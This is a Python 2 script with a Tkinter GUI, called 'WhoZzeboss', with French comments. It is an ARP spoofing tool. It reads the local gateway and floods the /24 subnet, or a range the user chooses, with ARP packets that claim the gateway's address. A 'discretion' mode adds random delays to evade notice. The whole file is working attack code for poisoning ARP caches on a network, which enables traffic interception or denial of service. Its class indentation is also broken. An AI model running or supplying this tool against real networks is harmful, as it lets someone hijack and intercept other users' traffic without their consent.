from scapy.all import *
from Tkinter import *
import socket, struct, threading, time, random
import threading


	

		#Lecture de la gateway sur linux
def get_default_gateway_linux():
	with open("/proc/net/route") as fh:
		for line in fh:
			fields = line.strip().split()
			if fields[1] != '00000000' or not int(fields[3], 16) & 2:
				continue
			return socket.inet_ntoa(struct.pack("<L", int(fields[2], 16)))

#extraction du prefixe reseau (on est en cidr 24) - la variable network aura par exemple "192.168.1." pour valeur
net1 = get_default_gateway_linux().split('.')[0]
net2 = get_default_gateway_linux().split('.')[1]
net3 = get_default_gateway_linux().split('.')[2]
network = str(net1) + '.' + str(net2) + '.' + str(net3) + '.'
#definition de la range complete
rangenetall = network + '1-254'

class pwnth(threading.Thread):
	def __init__(self):
        	super(pwnth, self).__init__()
        	self._arret = threading.Event()

    	def arret(self):
        	self._arret.set()
		def arrete(self):
        	return self._arret.isSet()
		
#fonction pour envoyer le paquet ARP a toute la range en utilisant scapy
	def pwnall(self):
		a=Ether()/ARP(op="who-has",psrc=get_default_gateway_linux(),pdst=rangenetall)
		print "Je pownerai cet intervalle : " + rangenetall
		self.start()
		while not self._arret.isSet():
			sendp(a)

#fonction pour envoyer le paquet ARP a une range specifique en utilisant scapy
	def pwncust(self,premadr,dernadr):
		rangecust = network + premadr + "-" + dernadr
		print "Je pownerai cet intervalle : " + rangecust
		b=Ether()/ARP(op="who-has",psrc=get_default_gateway_linux(),pdst=rangecust)
		self.start()
		#sendp(a,inter=RandNum(2,10),loop=1)
		while not self._arret.isSet():
			sendp(b)
#IDEM en mode discret
	def pwnallstlh(self):
		c=Ether()/ARP(op="who-has",psrc=get_default_gateway_linux(),pdst=rangenetall)
		print "Je pownerai cet intervalle : " + rangenetall
		self.start()
		while not self._arret.isSet():
			time.sleep(random.randrange(2,10))
			sendp(c)
			
	#IDEM en mode discret
	def pwncuststlh(self,premadr,dernadr):
		rangecust = network + premadr + "-" + dernadr
		print "Je pownerai cet intervalle : " + rangecust
		d=Ether()/ARP(op="who-has",psrc=get_default_gateway_linux(),pdst=rangecust)
		self.start()
		while not self._arret.isSet():
			time.sleep(random.randrange(2,10))
			sendp(d)
		
p = pwnth()

# creation de l'interface graphique utilisant Tkinter
root = Tk()
root.title("WhoZzeboss")
root.geometry("800x120")
app = Frame(root)
app.grid()

#valeurs par defaut... du titre du bouton, de l'etat de la case a cocher, 
msgbttn = "Je SUIS la gateway de tout ce reseau!!!"
customiz = BooleanVar()
customiz.set(False)
stlh = BooleanVar()
stlh.set(False)
#creation des textes et des cases a remplir, et du message du bas de la fenetre 
label_premadr = Label(app, text = "debut ou adresse ip simple")
label_dernadr = Label(app, text = "fin (facultatif)")
case_premadr = Entry(app, bg= "#BBBBBB")
case_dernadr = Entry(app, bg= "#BBBBBB")
result = Label(app, text = "Allez... un peu de courage !")

#definition de l'action
def action():
#cas avec case cochee pour customisation de la range
	if customiz.get():
	#cas avec la case de la derniere adresse etant vide
		if not case_dernadr.get():
			if stlh.get():
				p.pwncuststlh(case_premadr.get(),case_premadr.get())
			else:
				p.pwncust(case_premadr.get(),case_premadr.get())
		
	#cas avec la case de la derniere adresse remplie
		else:
			if stlh.get():
				p.pwncuststlh(case_premadr.get(),case_dernadr.get())
			else:
				p.pwncust(case_premadr.get(),case_dernadr.get())
#cas avec case de customisation de la range non cochee : lancement de la fonction pour la range de tout le reseau
	else:
		if stlh.get():
			p.pwnallstlh()
		else:
			p.pwnall()
#redefinition du texte du bas de la fenetre
	result["text"] = "Spawnage off"

#creation du bouton d'action
submit_button = Button(app,text = msgbttn, command = action)
stop_button = Button(app,text = "stop", command = p.arret)
#####
#creation de la fonction qui definit le comportement du programme en fonction de l'etat de la case a cocher

def swcustom():
#cas ou la case est cochee pour customisation
	if customiz.get():
		case_premadr["bg"] = "#FFFFFF"
		case_dernadr["bg"] = "#FFFFFF"
		if stlh.get():
			submit_button["text"] = "Ca prendra le temps mais les cibles sont designees..."
		else:
			submit_button["text"] = "VOUS allez manger !!!!"
#cas ou la case n'est pas cochee pour customisation
	else:
		case_premadr["bg"] = "#BBBBBB"
		case_dernadr["bg"] = "#BBBBBB"
		if stlh.get():
			submit_button["text"] = "Lentement mais surement, tout le reseau y passera (non garanti...)"
		else:
			submit_button["text"] = "Je SUIS la gateway de tout ce reseau!!!"
			
def swstlh():
#cas ou la case est cochee pour customisation
	if customiz.get():
		if stlh.get():
			submit_button["text"] = "Ca prendra le temps mais les cibles sont designees..."
		else:
			submit_button["text"] = "VOUS allez manger !!!!"
#cas ou la case n'est pas cochee pour customisation
	else:
		if stlh.get():
			submit_button["text"] = "Lentement mais surement, tout le reseau y passera (non garanti...)"
		else:
			submit_button["text"] = "Je SUIS la gateway de tout ce reseau!!!"

#definition du texte annoncant l'utilite de la case a cocher
rangetext = "Range cible (facultatif) : " + network
#definition du texte annoncant l'utilite de la case a cocher
stlhtext = "Option discretion"
#creation des cases a cocher
checkchoix = Checkbutton(app, text = rangetext, variable = customiz, command = swcustom)
checkstlh = Checkbutton(app, text = stlhtext, variable = stlh, command = swstlh)
#positionnement des objets : les deux cases a remplir et leurs labels, le texte du bas de la fenetre, la case a cocher et enfin le bouton
label_premadr.grid(row = 1,column = 1)
case_premadr.grid(row = 2,column = 1, columnspan = 1, sticky = W)
label_dernadr.grid(row = 1,column = 2)
case_dernadr.grid(row = 2,column = 2, columnspan = 1, sticky = W)
result.grid(row = 4, column = 0)
checkchoix.grid(row = 2, column = 0, sticky = W)
checkstlh.grid(row = 0, column = 0, sticky = W)
submit_button.grid(row = 3, column = 0, sticky = W)
stop_button.grid(row = 3, column = 1, sticky = W)

#boucle Tkinter permettant l'execution de l'interface graphique
root.mainloop()

#Un travail de Jonathan Suissa - RSSI 3
